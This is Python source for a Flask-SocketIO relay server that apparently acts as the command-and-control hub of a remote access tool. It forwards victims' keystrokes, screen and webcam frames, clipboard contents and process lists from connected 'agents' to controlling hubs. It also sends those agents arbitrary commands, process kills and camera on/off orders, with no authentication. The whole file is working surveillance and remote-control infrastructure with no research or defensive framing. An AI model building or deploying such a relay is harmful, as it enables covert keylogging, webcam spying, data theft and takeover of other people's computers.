from flask import Flask, request
from flask_socketio import SocketIO, emit, join_room
import os

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
                    max_http_buffer_size=10 * 1024 * 1024)

agents   = {}  # sid  -> name
name_sid = {}  # name -> sid
HUB_ROOM = "hubs"


@socketio.on("disconnect")
def on_disconnect():
    name = agents.pop(request.sid, None)
    if name:
        name_sid.pop(name, None)
        socketio.emit("agent_down", {"name": name}, room=HUB_ROOM)


@socketio.on("register")
def on_register(data):
    name = data.get("name", "unknown")
    agents[request.sid] = name
    name_sid[name] = request.sid
    join_room(f"agent:{name}")
    socketio.emit("agent_up", {"name": name}, room=HUB_ROOM)
    emit("ok")


@socketio.on("hub_join")
def on_hub_join():
    join_room(HUB_ROOM)
    emit("agents_online", list(set(agents.values())))


def _make_forwarder(evt):
    def handler(data):
        name = agents.get(request.sid)
        if name:
            payload = dict(data) if isinstance(data, dict) else {"raw": data}
            payload["_agent"] = name
            socketio.emit(evt, payload, room=HUB_ROOM)
    return handler


for _evt in ["frame", "key", "camera_frame", "clipboard", "processes_data", "camera_state"]:
    socketio.on_event(_evt, _make_forwarder(_evt))


def _to_agent(evt, data):
    target = data.get("target") if isinstance(data, dict) else None
    if target and target in name_sid:
        socketio.emit(evt, data, room=f"agent:{target}")


@socketio.on("command")
def on_cmd(data):      _to_agent("command", data)

@socketio.on("request_processes")
def on_req_proc(data): _to_agent("request_processes", data)

@socketio.on("kill_process")
def on_kill(data):     _to_agent("kill_process", data)

@socketio.on("camera_on")
def on_cam_on(data):   _to_agent("camera_on", data)

@socketio.on("camera_off")
def on_cam_off(data):  _to_agent("camera_off", data)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
